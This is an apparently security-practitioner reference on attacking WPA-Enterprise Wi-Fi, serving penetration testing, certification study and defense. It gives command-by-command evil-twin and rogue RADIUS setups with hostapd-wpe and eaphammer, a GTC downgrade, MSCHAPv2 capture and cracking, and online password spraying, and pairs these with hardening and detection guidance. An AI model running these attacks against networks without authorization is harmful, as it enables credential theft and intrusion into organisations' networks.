# WPA-Enterprise / 802.1X / EAP Attacks — Command-First Reference

> **Scope & authorization.** This reference is for **authorized** work only: your own enterprise lab,
> gear you own, sanctioned engagements with written rules of engagement (RoE), CTF, and OSWP study.
> Standing up a rogue RADIUS / evil-twin against a network you are not authorized to test is a crime in
> most jurisdictions (US: CFAA; UK: Computer Misuse Act; EU: national equivalents). Every offensive
> technique below is paired with its **defense**. For the captive-portal / credential-phishing cover,
> this file covers **detection + concept only** — it does **not** build a credential-harvesting web
> portal or keylogging login page. The legitimate, OSWP-standard technique here is **impersonating the
> RADIUS server to capture the inner EAP challenge/response and crack it offline**; that is what the
> commands target.

---

## 0. TL;DR decision tree (read this first)

```
Confirm Enterprise (airodump AUTH=MGT) ──► sniff ONE real auth (EAPOL 0x888e)
        │                                        │
        │                                        ├─ username/realm from Phase-1 Response/Identity (cleartext)
        │                                        └─ offered EAP method (PEAP=25 / TTLS=21 / TLS=13 / FAST=43)
        ▼
   EAP-TLS only?  ──yes──► STOP. Client cert required. Not crackable this way. (Report: good.)
        │no
        ▼
   Have usernames + weak-password org?  ──► air-hammer ONLINE SPRAY (no rogue AP) ... lockout-risky
        │
        ▼
   Stand up evil-twin + fake RADIUS (eaphammer --creds, default negotiation)
        │
        ├─ client validates cert ──► won't complete = DEFENSE WORKING (a finding, not a failure)
        ├─ TTLS/PAP or GTC-tolerant ──► CLEARTEXT password, no cracking
        └─ PEAP/TTLS-MSCHAPv2 ──► capture challenge/response ──► crack on Mac GPU (hashcat -m 5500)
                                                              └─ or chapcrack → crack.sh = guaranteed NT-hash
```

The single lever that kills this entire class: **the supplicant correctly validating the RADIUS
server certificate (right CA + right server name, no user prompt).** Everything below is a way to
profit when that lever is off.

---

## 1. Concept (brief)

**802.1X** is port-based network access control. On Wi-Fi (WPA/WPA2/WPA3-Enterprise, shown as **MGT**
in `airodump-ng`), three roles:

- **Supplicant** — the client (laptop/phone) with its 802.1X profile.
- **Authenticator** — the AP/controller; relays EAP, opens the controlled port only on success.
- **Authentication server** — the **RADIUS** server (FreeRADIUS, Microsoft NPS, Cisco ISE, Aruba ClearPass).

The AP is a **dumb relay** (it bridges EAP-over-LAN ↔ RADIUS). The real authentication is an **EAP**
(Extensible Authentication Protocol) conversation tunneled between supplicant and RADIUS server. The
AP/attacker never sees the plaintext password — only what the EAP method leaks.

| EAP method | Outer (Phase 1) | Inner (Phase 2) | What leaks if you impersonate RADIUS |
|---|---|---|---|
| **PEAP-MSCHAPv2** | TLS tunnel | MSCHAPv2 | username (cleartext, Phase 1) + MSCHAPv2 **challenge/response** → offline crack |
| **EAP-TTLS/PAP** | TLS tunnel | PAP | username + **cleartext password** (inside tunnel) |
| **EAP-TTLS/MSCHAPv2** | TLS tunnel | MSCHAPv2 | challenge/response → offline crack |
| **EAP-GTC** | TLS tunnel | cleartext token | **cleartext password** (the downgrade target) |
| **EAP-FAST** | TLS (PAC) tunnel | MSCHAPv2/GTC | challenge/response or cleartext |
| **EAP-MD5** | none | MD5 challenge | challenge/response on open air (no tunnel); identity in clear |
| **LEAP** | none | MSCHAPv1-ish | challenge/response (legacy Cisco, weak; `asleap` was written for it) |
| **EAP-PWD** | none (PAKE) | — | nothing directly; offline dict if exchange captured (rare) |
| **EAP-TLS** | mutual TLS (client cert) | — | **nothing** — client cert required; immune to this class |

### The one weakness everything exploits

The TLS tunnel (PEAP/TTLS/FAST) protects the inner credential **only if the supplicant validates the
RADIUS server certificate** — the correct **CA** *and* the correct **server name**. If the client does
not validate (or the user clicks through a cert warning), an attacker running a rogue AP + fake RADIUS
**terminates the TLS tunnel themselves**, receives the inner MSCHAPv2 exchange, and cracks it offline.
**Server-certificate validation on the supplicant is the only thing between a client and a rogue RADIUS
server.** EAP-TLS is immune because it requires a client certificate the attacker cannot produce.

MSCHAPv2 is itself cryptographically broken (see §13): a captured challenge/response reduces to a
single DES-56 key, so a "strong" password does not save PEAP-MSCHAPv2 once the handshake is captured —
it only decides whether a dictionary, mask, or full-keyspace (crack.sh) attack is needed, and the
recovered **NT hash** enables pass-the-hash regardless of plaintext.

---

## 2. Lab prerequisites (own gear)

- **Adapter:** TP-Link RTL8188EUS (2.4 GHz, `8188eu` driver) — must support **AP/master mode** via
  `hostapd` (that is what a fake RADIUS AP needs; monitor mode is only for recon/deauth). Some
  `8188eu` driver builds do monitor fine but flake as an AP — verify before the engagement.
- **Kali** with `hostapd-wpe`, `eaphammer`, `asleap`, `eapmd5pass`, `hashcat`, `hcxtools`,
  `wpa_supplicant` (to build a **known-good validating client** and test your own defenses),
  `freeradius` (optional, to run a real server for the lab's "blue" side).
- **Mac GPU** for `hashcat` (capture on Kali, crack on the Mac/host — never bottleneck the rogue AP box).

```bash
# Kali: confirm tools present / install
which hostapd-wpe eaphammer asleap eapmd5pass hashcat hcxdumptool
sudo apt-get update && sudo apt-get install -y hostapd-wpe eaphammer asleap eapmd5pass

# Confirm the adapter supports AP mode (look for "* AP" under supported interface modes)
iw dev
iw list | sed -n '/Supported interface modes/,/Band/p'

# Free the radio (NetworkManager / wpa_supplicant will steal it mid-attack otherwise)
sudo airmon-ng check kill
sudo rfkill unblock wifi
```

Lab topology for safe practice: run a **real** FreeRADIUS + a known-good `wpa_supplicant` client on
one box (the "blue" side), and your `eaphammer`/`hostapd-wpe` rogue AP on the Kali box (the "red" side).
Prove the attack works against a *non-validating* client, then flip validation on and prove it dies.

---

## 3. Recon — confirm Enterprise, ID the EAP method, harvest usernames

Before any rogue AP, know: (a) it's WPA-Enterprise, (b) the real BSSID/ESSID/channel, (c) the EAP
method clients use, (d) valid usernames.

```bash
# (a) Enterprise shows AUTH = MGT (not PSK) in airodump
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --band bg          # 2.4GHz for the RTL8188EUS
#   ENC=WPA2  CIPHER=CCMP  AUTH=MGT   <-- Enterprise (PSK would be AUTH=PSK)

# (b) lock onto the target to get channel + connected clients (STATION list)
sudo airodump-ng -c <ch> --bssid <AP_BSSID> -w ent-recon wlan0mon
```

**Identify the EAP method + harvest identities** by watching a real authentication. The EAP
**Response/Identity** (username/realm, e.g. `bob@corp.local`) is sent **in cleartext in Phase 1**,
before the TLS tunnel — true even for PEAP and EAP-TLS. This is your username source.

```bash
# Capture only EAP/EAPOL frames (ethertype 0x888e)
sudo tcpdump -i wlan0mon -w eap.pcap 'ether proto 0x888e'
# Or live, headless, with tshark — pull usernames + EAP types:
sudo tshark -i wlan0mon -Y eap -T fields \
  -e wlan.sa -e eap.identity -e eap.type

# Wireshark/tshark display filters that matter:
#   eap                      all EAP
#   eap.identity             the cleartext username/realm (Phase-1 Response/Identity)
#   eap.type == 25           PEAP     (TTLS=21, TLS=13, FAST=43, GTC=6, MD5=4, LEAP=17, Identity=1, NAK=3)
#   eaptls.handshake.certificate   the server cert the client was offered (fingerprint/CN/SAN)
```

**EAP type codes** (memorize the top four): `1`=Identity, `3`=Legacy-NAK, `4`=MD5, `6`=GTC, `13`=TLS,
`17`=LEAP, `21`=TTLS, `25`=PEAP, `43`=FAST, `52`=PWD.

Weak-method opportunism: if the network offers **EAP-MD5** (no tunnel), the challenge/response is on
the open air — crack it directly, no rogue AP:

```bash
eapmd5pass -r eap.pcap -w /usr/share/wordlists/rockyou.txt     # offline MD5 challenge/response crack
```

Pro note: anonymous outer identities (`anonymous@corp.local`) hide the real inner username on
well-configured clients — but many deployments still leak the true identity in Phase 1.

---

## 4. Attack Path A — Fake RADIUS with `hostapd-wpe` (classic, OSWP-standard)

`hostapd-wpe` = **hostapd Wireless Pwnage Edition** (Brad Antoniewicz; successor to Joshua Wright's
`FreeRADIUS-WPE`). It stands up an AP + rogue RADIUS that answers **EAP-Success** so the client
believes it connected, and prints the captured credentials (console + `hostapd-wpe.log`).

```bash
# 1. Config ships at /etc/hostapd-wpe/hostapd-wpe.conf  (certs pre-wired to bundled test certs)
sudo nano /etc/hostapd-wpe/hostapd-wpe.conf
```

Minimum config to set:

```ini
interface=wlan0
driver=nl80211            # RTL8188EUS/8188eu uses nl80211; set this if AP mode fails
ssid=CorpWifi             # match the target ESSID exactly (evil twin)
channel=6                 # match a clean/target channel (2.4GHz for this adapter)
hw_mode=g
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.pem
private_key_passwd=whatever
```

```bash
# 2. Free the radio, then launch
sudo airmon-ng check kill
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

**Supported inner methods for impersonation:** EAP-FAST/MSCHAPv2 (Phase 0), PEAP/MSCHAPv2,
EAP-TTLS/MSCHAPv2, /MSCHAP, /CHAP, /PAP, EAP-MD5, LEAP.

**Useful flags:**

| Flag | Effect |
|---|---|
| `-s` | output to stdout as well as the log |
| `-c` | **Cupid** mode — Heartbleed (CVE-2014-0160) against vulnerable supplicant TLS stacks |
| `-k` | **Karma** mode — respond to all probe requests (answer any SSID a client probes for) |

(Older docs reference `-r` for "return EAP-Success"; modern builds return success by default. Verify
with `hostapd-wpe -h` on your build — flag letters drift between packages.)

**Output** (console + `/root/hostapd-wpe.log`) for a PEAP/TTLS-MSCHAPv2 client:

```
mschapv2: Thu ...  user=bob
   username:   bob
   challenge:  1a:2b:3c:4d:5e:6f:7a:8b              # 8-byte authenticator challenge
   response:   aa:bb:...(24 bytes)...               # 24-byte NT response
   jtr NETNTLM: bob:$NETNTLM$1a2b3c4d5e6f7a8b$aabb...   # ready-to-crack line (John format)
```

If the client runs **EAP-TTLS/PAP**, the inner credential is the **cleartext password** — it prints
directly, no cracking. That is the single highest-value outcome and why TTLS/PAP is a config smell to
flag in your report.

---

## 5. Attack Path B — `eaphammer` (modern; automates negotiation + downgrade)

`eaphammer` (Gabriel Ryan / s0lst1c3) is the current go-to. It auto-negotiates the EAP method per
client, **now automatically attempts a GTC-downgrade against connected clients**, and can autocrack.
Run from its own directory (`cd /path/to/eaphammer && ./eaphammer ...`).

### 5.1 Generate the rogue server certificate (one-time)

```bash
./eaphammer --cert-wizard                      # interactive create
./eaphammer --bootstrap                        # one-shot setup incl. self-signed cert (first run)
./eaphammer --cert-wizard import               # import an existing cert set into eaphammer's config
```

Pro move: if an authorized scope provided the target's real CA chain / a look-alike cert,
`--cert-wizard import` it so even some validating clients match the CA. On a self-signed cert, a
validating client simply refuses — which is the point of the test.

### 5.2 Credential-capture evil twin (the core command — confirmed against current README)

```bash
./eaphammer -i wlan0 \
  --channel 6 \
  --auth wpa-eap \
  --essid CorpWifi \
  --creds
#   -i / --interface  wireless iface
#   --channel         operate on target channel
#   --auth wpa-eap    802.1X  (add --wpa-version 2 for WPA2, 1 for WPA; default is both)
#   --essid           evil-twin SSID (match target exactly)
#   --creds           credential-capture mode -> prints/saves MSCHAPv2 challenge/response (+ auto GTC downgrade)
# MSCHAPv2 capture succeeds regardless of password strength; crack difficulty varies, capture does not.
```

Captured hashes are written under `eaphammer`'s `loot/` directory in John/hashcat-ready form.

### 5.3 EAP negotiation modes (`--negotiate`) — pick based on client behavior

| Mode | Command | When to use |
|---|---|---|
| **balanced** (default) | omit, or `--negotiate balanced` | tries GTC first, falls back to stronger methods — good default |
| **speed** | `--negotiate speed` | clients won't finish in default mode; proposes most-likely-to-succeed first |
| **weakest** | `--negotiate weakest` | force weakest→strongest full downgrade; slow negotiation, maximum leak |
| **gtc-downgrade** | `--negotiate gtc-downgrade` | offer **only PEAPv1 + GTC** → inner password cleartext if client accepts (legacy flag; current builds also try this automatically) |
| **manual** | `--negotiate manual` + method lists | mimic the real AP's exact method order to avoid client suspicion |

**Manual negotiation (mimic a real AP to look legitimate):**

```bash
./eaphammer --interface wlan0 \
  --negotiate manual \
  --phase-1-methods PEAP,TTLS \
  --phase-2-methods MSCHAPV2,GTC,TTLS-MSCHAP \
  --auth wpa-eap --essid CorpWifi --creds
```

**Hand-written EAP user file** (full control over offered methods):

```bash
./eaphammer --interface wlan0 \
  --eap-user-file /tmp/custom.eap_user \
  --auth wpa-eap --essid CorpWifi --creds
```

Minimal `eap_user` file (offer PEAP outer, MSCHAPv2 inner, accept anything):

```
*     PEAP
"t"   MSCHAPV2    "t"    [2]
```

### 5.4 AutoCrack 'n Add

```bash
./eaphammer -i wlan0 --essid CorpWifi -c 6 --auth wpa-eap --creds --autocrack
#   --autocrack  feed captured MSCHAPv2 to the internal cracker, append cracked creds to the eap_user file
```

Gotcha: `--autocrack` uses eaphammer's **internal** cracker (slow without a rig) and hostapd must
restart to load newly added creds. For real speed, export the hash and crack on the Mac GPU (§7).

---

## 6. GTC downgrade — getting the password in cleartext

**Concept:** EAP-GTC (Generic Token Card) carries the inner secret in **cleartext** inside the TLS
tunnel (designed for OTP tokens, but clients will send the AD password). If you impersonate RADIUS and
offer **only** PEAP+GTC, a client that doesn't validate the server cert and accepts GTC hands you the
password with no cracking. Credit: Josh Hoover (W00Tock) / the eaphammer project.

```bash
./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid CorpWifi --creds --negotiate gtc-downgrade
```

Trade-off / detection note: the downgrade is **louder** than passive MSCHAPv2 capture — a client that
expected MSCHAPv2 and is offered GTC emits **EAP-NAK (type 3)** frames, and many supplicants refuse GTC
outright, so you get nothing and generate WIDS-visible anomalies. Try the default/`balanced` path
first; reach for explicit `gtc-downgrade` once you've confirmed clients tolerate it. iOS/macOS and
hardened Windows profiles that restrict acceptable inner methods will refuse — again, a good finding.

---

## 7. Cracking the captured handshake (Mac GPU)

### 7.1 `asleap` (quick dictionary, on Kali)

```bash
# Straight from the hostapd-wpe challenge/response:
asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt
#   -C  authenticator challenge (hex, colons ok)   -R  NT response (hex)   -W  wordlist
#   asleap was originally written to break LEAP; it handles MSCHAPv2 challenge/response the same way.
```

### 7.2 `hashcat -m 5500` (NetNTLMv1) — the format that actually works

MSCHAPv2 challenge/response == **NetNTLMv1**. hostapd-wpe prints a JtR `NETNTLM` line; convert it to
the hashcat **5500** layout `username::domain::LMresp:NTresp:challenge` (domain + LM left blank):

```bash
# hostapd-wpe prints:   bob:$NETNTLM$<challenge>$<response>
# Convert to hashcat 5500 ( username::::<NTresp>:<challenge> ):
echo 'bob:$NETNTLM$1a2b3c4d5e6f7a8b$aabbcc...' \
 | sed -E 's/^(.*):\$NETNTLM\$(.*)\$(.*)$/\1::::\3:\2/'
#   -> bob::::aabbcc...:1a2b3c4d5e6f7a8b

# Crack on the Mac GPU:
hashcat -m 5500 -a 0 hash.txt /path/wordlists/rockyou.txt                 # dictionary
hashcat -m 5500 -a 0 hash.txt rockyou.txt -r rules/best64.rule            # + rules
hashcat -m 5500 -a 0 hash.txt rockyou.txt -r rules/OneRuleToRuleThemAll.rule
hashcat -m 5500 -a 3 hash.txt '?u?l?l?l?l?l?d?d'                          # mask / brute
```

**The #1 failure:** wrong field layout. Mode 5500 needs the right number of `:`-separated fields; a
capture that includes a **client challenge (ESS)** must use the full format or it never matches.
`-m 5500` = NetNTLMv1 / NetNTLMv1+ESS; `-m 5600` = NetNTLMv2 (a different capture type — do not force a
v1 capture into 5600). Sanity-check the layout with `hashcat --example-hashes | grep -A2 5500`.

### 7.3 Guaranteed break via DES reduction (`chapcrack` → `crack.sh`)

MSCHAPv2 reduces to a single DES key (§13). `chapcrack` parses the handshake (pcap) and emits a token
you submit to a DES-exhaustion service (historically CloudCracker; today **crack.sh**), which returns
the **NT hash** in ≤ ~1 day (100% keyspace, FPGA). The NT hash then **authenticates (pass-the-hash)
even without the plaintext.** This is the "strong password doesn't matter" path — material for your
report's risk rating.

```bash
chapcrack parse -i mschapv2.pcap           # emits the crack.sh token
# submit the token to crack.sh -> returns NT hash
```

### 7.4 Speed / pro tips

- Capture on Kali, **crack on the Mac GPU** — never bottleneck on the rogue AP box.
- MSCHAPv2 / NetNTLMv1 (5500) is a **fast** hash; run `rockyou + best64 / OneRuleToRuleThemAll` before
  masks.
- Target the realm: build a wordlist from the org (company name, seasons+year like `Winter2026!`,
  masks for the known password policy). Enterprise AD passwords cluster hard on policy minimums.
- If you got **TTLS/PAP or GTC**, skip cracking — you already have cleartext.
- Keep a shared `potfile`; dedupe captured users (`sort -u`) so you don't re-crack the same hash.
- Need the hash offline fast and GPU is busy? `chapcrack`→crack.sh is deterministic (time-boxed), so
  it is the fallback when dictionary+mask fails.

---

## 8. Online password spray — `air-hammer` (no evil twin)

A completely different vector: WPA-Enterprise accepts **thousands** of valid user/pass combos (unlike
PSK's single password), and users pick weak passwords. `air-hammer` (Wh1t3Rh1n0) sprays a small
password set across a **username list, directly at the real network** — no rogue AP, no cert, nothing
to crack.

```bash
# Requires a username list (harvest from EAP Response/Identity §3, OSINT, email format corp\first.last)
air-hammer.py -i wlan0 -e CorpWifi -P passwords.txt -u users.txt
#   one well-chosen password (e.g. Winter2026!) across ALL users beats one user / many passwords
#   -1   stop after first valid pair (optional)
```

Reality check: ~1–5 s per attempt → online spraying is **slow** and account-lockout-risky; use 1–2
passwords max, respect lockout thresholds, and only within RoE. The author's own recommended minimum
defense: a password policy that blocks weak/common passwords, plus lockout alerting.

---

## 9. Hostile portal & captive portal — concept + DETECTION only

- **eaphammer `--hostile-portal`** redirects a connected client's HTTP to an **SMB share** on the
  attacker box so **Responder** captures NetNTLM hashes (a post-association network pivot, not a web
  login page). `--pivot` runs Responder without the SMB server. This is a lateral/credential-relay
  technique; in scope only with explicit RoE, and it is network-layer, not a phishing page.
- **Credential-phishing captive portals** (a cloned corporate login page + keylogger that harvests the
  typed plaintext password) are **out of scope for this reference — not built here.** Cover them by
  **detection**:
  - A legitimate WPA-Enterprise join **never** needs a web login form asking for the AD password — a
    portal that does is itself the tell. Train users: no browser popup should ever ask for the domain
    password to join Wi-Fi.
  - **Detect rogue APs / evil twins:** watch for a **second BSSID** broadcasting your ESSID, a
    **different RADIUS cert** (wrong issuer / thumbprint / server name) presented to clients, unexpected
    **EAP method offers** (GTC where you only deploy PEAP-MSCHAPv2), bursts of **EAP-NAK (type 3)**, and
    **deauth floods** preceding a new BSSID. WIDS/WIPS (Cisco, Aruba, Ekahau, Kismet) and a simple
    `airodump-ng` BSSID watch both surface this.

```bash
# Cheap rogue-AP watch on your own ESSID (blue-team): alert on any BSSID != your known APs
sudo airodump-ng wlan0mon --essid CorpWifi --band bg -w rogue-watch
# Kismet will flag advertised-SSID/BSSID anomalies and new devices automatically.
```

---

## 10. Decision order (how pros actually run it)

1. **Confirm Enterprise** (`AUTH=MGT`) and grab channel/BSSID/clients (§3).
2. **Sniff one real auth** → identify EAP method + **harvest usernames** from Phase-1 identity (§3).
3. **EAP-TLS only?** Stop — client cert required; this class does not apply. (Report it as a strength.)
4. **Cheapest win first:**
   - Weak/known passwords + have usernames → **air-hammer spray** (no infra) (§8).
   - EAP-MD5 offered → `eapmd5pass` on the sniffed pcap, no rogue AP (§3).
   - EAP-TTLS/PAP or GTC-tolerant clients → rogue RADIUS → **cleartext**, done (§5/§6).
5. **Standard path:** evil twin + fake RADIUS (`eaphammer --creds`, default negotiation); if clients
   won't complete, try `--negotiate speed`, then `weakest`, then explicit `gtc-downgrade` (§5.3).
6. **Nudge clients** onto your AP only if needed: a **single targeted deauth** of one STA (minimize
   disruption; never broadcast-deauth in a shared-space engagement).
7. **Crack offline on the Mac GPU** — dictionary+rules → masks; or `chapcrack`→crack.sh for a
   guaranteed NT-hash break (§7).
8. **Report** EAP method, whether clients validated the cert, which users fell, and the cracked/clear
   creds — tie each to a defense (§11).

---

## 11. DEFENSE (pair every attack above with this)

The entire attack class dies if the supplicant **validates the server certificate correctly.** Harden
in this order:

### 11.1 Enforce server-certificate validation on every client (highest impact)
- Turn on **"Validate server certificate"** *and* specify the exact **RADIUS server name(s)**. Windows
  checks the **SAN DNS name** (it ignores CN when a SAN DNS entry exists), so the profile must list the
  server's SAN. **Pin the trusted root CA** so only your internal CA is accepted — never leave "any
  trusted root in the store."
- **Push the profile via MDM / GPO / Intune** — never let end users hand-configure. Manual config is
  the vulnerability: users untick validation or accept any CA to "just get online."
- **Disable "trust on first use" / do not prompt the user** to accept new server certs. On WPA3-Enterprise
  and current Windows, a failed server validation refuses to enter Phase 2, so the inner credential is
  never sent — enable the strict (no-prompt) variant. Windows 11 tightened this; older Windows 10 could
  validate on root-store presence alone, which eaphammer-style attacks abused.

### 11.2 Prefer certificate-based EAP-TLS (eliminates the class)
- **EAP-TLS** requires a **client certificate** → no shared secret for a rogue RADIUS to harvest →
  immune to PEAP/TTLS/GTC capture and to MSCHAPv2's DES weakness. Provision client certs via the
  internal PKI / MDM / SCEP. This is the strategic fix; PEAP-MSCHAPv2 is the thing you are retiring.
- For high-assurance: **WPA3-Enterprise 192-bit mode** (CNSA/Suite-B) mandates EAP-TLS with specific
  cipher suites and server-cert validation — no fallback to crackable inner methods.

### 11.3 If you must keep PEAP/TTLS
- Mandate **PEAP-MSCHAPv2 only** with strict validation; **never offer EAP-GTC, EAP-MD5, LEAP, or
  TTLS/PAP** (PAP and GTC hand over cleartext; MD5/LEAP leak crackable challenge/response on open air).
- Strong, policy-enforced passwords **slow** cracking but do **not** stop capture, the DES break, or
  pass-the-hash — do not rely on password strength alone.
- **Known-good validating `wpa_supplicant` client** (Linux/Android reference, and the template your MDM
  should enforce) — pin CA **and** server name:
  ```ini
  network={
      ssid="CorpWifi"
      key_mgmt=WPA-EAP
      eap=PEAP
      ca_cert="/etc/ssl/certs/corp-ca-chain.pem"   # pin the exact internal CA (not system store)
      domain_suffix_match="radius.corp.local"       # server-name check; blocks look-alike certs
      anonymous_identity="anonymous@corp.local"      # hide real username in Phase 1
      identity="bob@corp.local"
      password="..."
      phase2="auth=MSCHAPV2"
  }
  ```
  Note `domain_suffix_match=example.com` also matches `sub.example.com`; use `domain_match=` for an
  **exact** server-name match when you need to exclude look-alikes. A client with these two lines set
  correctly will **refuse** every eaphammer/hostapd-wpe self-signed rogue above — that is the test's
  pass criterion.

### 11.4 Detection / monitoring
- **WIDS/WIPS** for rogue APs: duplicate ESSID on a new BSSID, wrong RADIUS cert thumbprint, anomalous
  EAP method offers (GTC/MD5), EAP-NAK bursts, deauth floods.
- Alert on **RADIUS auth failures** from an unknown NAS/AP and on **impossible-travel** auths.
- Use **anonymous outer identities** so Phase-1 sniffing and username spraying get less to work with.
- **Rate-limit + lockout** to blunt `air-hammer` online spraying; monitor for spray patterns (one
  password, many users, one source) — and tune lockout so an attacker cannot DoS all accounts.

---

## 12. Gotchas & pitfalls

- **RTL8188EUS in AP mode:** confirm `iw list` shows `* AP` under supported modes; some `8188eu` driver
  builds do monitor but flake as an AP. Set `driver=nl80211` in the hostapd conf. Kill
  `NetworkManager`/`wpa_supplicant` (`airmon-ng check kill`) or the radio is stolen mid-attack.
- **2.4 GHz only** on this adapter — a **5 GHz-only** client never sees your 2.4 GHz evil twin. Confirm
  the target band before committing.
- **Legacy hostapd-wpe build breakage:** old upstream build steps fail on modern Kali; prefer the
  packaged `apt install hostapd-wpe`, or use `eaphammer` (actively maintained).
- **hashcat 5500 format:** wrong `:` field count = never cracks; captures **with a client challenge**
  need the full format; don't confuse 5500 (v1) with 5600 (v2).
- **Clients that validate the cert** simply won't complete — that's a **finding** (defense working),
  not a tool failure. Never "fix" it by lowering their security.
- **GTC downgrade is loud** and often refused (EAP-NAK) — not a silent default on hardened clients.
- **Anonymous identity** hides the inner username; you may get `anonymous@corp.local` for the outer and
  only learn the real user inside the (impersonated) tunnel.
- **Online spray lockouts:** AD lockout policy can lock every sprayed account (self-DoS and a client
  incident) — know the threshold, stay under it, get it in writing in the RoE.
- **Cert matching nuance:** Windows matches **SAN DNS**, not CN, when a SAN exists; a rogue cert that
  only sets CN won't satisfy a correctly-configured Windows client even if the name looks right.

---

## 13. Crypto / CVE background (why this works)

- **MS-CHAPv2 is broken — DEF CON 20 (2012), Moxie Marlinspike & David Hulton, "Divide and Conquer."**
  The 16-byte NT hash is split into three DES keys; the third holds only 2 bytes of hash padded with
  zeros (brute-forced in moments), and all three encrypt the *same* known plaintext (the server
  challenge-derived value), so the whole thing reduces to **one DES-56 exhaustion** — 100% of keyspace
  in ≤ ~23 h on FPGA (CloudCracker, now **crack.sh**), originally ~$20/handshake. Consequence:
  **capturing** the handshake is sufficient; the recovered **NT hash** enables pass-the-hash even
  without the plaintext. Password strength does not protect PEAP-MSCHAPv2 post-capture.
- **CVE-2014-0160 (Heartbleed) / "Cupid":** vulnerable TLS stacks on either side of the EAP tunnel leak
  memory over the EAP-TLS/TTLS/PEAP handshake (pre-authentication). `hostapd-wpe -c` (Cupid) targets
  vulnerable supplicants; `cupid-wpa` is the companion. Fix: patch TLS libraries.
- **Credential Guard / modern Windows:** steer toward certificate-based EAP-TLS; Windows 11 hardened
  server-cert validation and removed the loose Win10 "root in store is enough" behavior — reinforces
  §11.2.
- **PPTP corollary:** the same MSCHAPv2 break means PPTP VPNs are effectively "unencrypted" — never
  reuse MSCHAPv2 anywhere, including VPN.
- **LEAP (Cisco, legacy):** MSCHAPv1-style, no server-cert protection; `asleap` was written for it.
  Any network still offering LEAP is a critical finding.

---

## 14. Sources

Official tool docs / wikis:
- eaphammer — README: https://github.com/s0lst1c3/eaphammer  *(core `--creds` command confirmed live, 2026-11)*
- eaphammer wiki — VIII. Attacking WPA EAP / WPA2 EAP Networks: https://github.com/s0lst1c3/eaphammer/wiki/VIII.-Attacking-WPA-EAP-and-WPA2-EAP-Networks
- eaphammer wiki — Using AutoCrack: https://github.com/s0lst1c3/eaphammer/wiki/Using-AutoCrack
- Kali Tools — hostapd-wpe: https://www.kali.org/tools/hostapd-wpe
- Kali Tools — eaphammer: https://www.kali.org/tools/eaphammer
- Kali Tools — cupid-wpa (Cupid/Heartbleed): https://www.kali.org/tools/cupid-wpa
- Kali Tools — asleap: https://www.kali.org/tools/asleap
- Kali Tools — eapmd5pass: https://www.kali.org/tools/eapmd5pass
- air-hammer (Wh1t3Rh1n0): https://github.com/Wh1t3Rh1n0/air-hammer
- chapcrack (moxie0): https://github.com/moxie0/chapcrack
- crack.sh — DES/MSCHAPv2 cracking service: https://crack.sh/

Methodology / writeups:
- pentest.blog — Attacking WPA Enterprise Wireless Network: https://pentest.blog/attacking-wpa-enterprise-wireless-network/
- HackTricks — Pentesting Wifi (enterprise / evil-twin EAP): https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi
- HardwareAllTheThings — WiFi Corporate: https://swisskyrepo.github.io/HardwareAllTheThings/protocols/wifi/wifi-corporate
- Gabriel Ryan (s0lst1c3) — "The Black Art of Wireless Post-Exploitation" (eaphammer methodology): https://github.com/s0lst1c3/eaphammer
- hashcat forum — hashes from hostapd-wpe (MSCHAPv2 → mode 5500 format): https://hashcat.net/forum/thread-7041.html
- hashcat wiki — example hashes (mode 5500 NetNTLMv1 layout): https://hashcat.net/wiki/doku.php?id=example_hashes

CVE / crypto background:
- DEF CON 20 (2012) — Marlinspike & Hulton, "Defeating PPTP VPNs and WPA2 Enterprise with MS-CHAPv2": https://media.defcon.org/DEF%20CON%2020/
- MS-CHAP (Wikipedia, incl. 2012 break): https://en.wikipedia.org/wiki/MS-CHAP
- Schneier — Breaking Microsoft's PPTP / MSCHAPv2 (2012): https://www.schneier.com/blog/archives/2012/08/breaking_micros.html
- Berkeley (Schneier/Mudge) — PPTPv2 analysis: https://people.eecs.berkeley.edu/~daw/papers/pptpv2.pdf
- NVD — CVE-2014-0160 (Heartbleed): https://nvd.nist.gov/vuln/detail/CVE-2014-0160

Defense:
- SecureW2 — PEAP-MSCHAPv2 vulnerability: https://www.securew2.com/blog/peap-mschapv2-vulnerability
- SecureW2 — Top PEAP-MSCHAPv2 mistakes: https://www.securew2.com/blog/top-3-peap-mschapv2-mistakes-universities
- Microsoft Learn — Windows 11 EAP / server-cert validation changes: https://learn.microsoft.com/windows-server/networking/technologies/extensible-authentication-protocol/windows-11-changes
- Bastille — PEAP relay research: https://www.bastille.net/research/vulnerabilities/
- hostap docs — wpa_supplicant `domain_suffix_match` / `domain_match`: https://w1.fi/cgit/hostap/plain/wpa_supplicant/wpa_supplicant.conf
- NSA — CNSA / WPA3-Enterprise 192-bit guidance: https://www.wi-fi.org/discover-wi-fi/security

> Note: WebSearch was unavailable this run (shared workflow budget exhausted), so this revision was
> written from deep expert knowledge; the eaphammer core command was re-confirmed against the live
> GitHub README, and the bibliography above is the canonical source set this reference is built on.
